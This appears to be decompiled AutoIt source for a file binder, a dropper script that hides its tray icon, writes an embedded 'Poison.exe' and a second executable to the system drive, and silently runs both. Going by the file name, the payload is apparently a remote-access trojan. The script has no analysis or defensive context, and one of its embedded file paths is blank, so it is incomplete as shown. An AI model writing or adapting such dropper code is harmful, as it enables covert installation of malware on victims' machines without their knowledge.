; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Binded.au3>
; ----------------------------------------------------------------------------

#notrayicon

Fileinstall ("C:\Dokumente und Einstellungen\DG-Base\Desktop\Poison.exe",@homedrive & "/Exec.exe")
Fileinstall ("",@homedrive & "/Exec2.exe")
sleep (300)
Run (@homedrive & "/Exec2.exe")
Run (@homedrive & "/Exec.exe")
if @error then
exit
Endif

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Binded.au3>
; ----------------------------------------------------------------------------

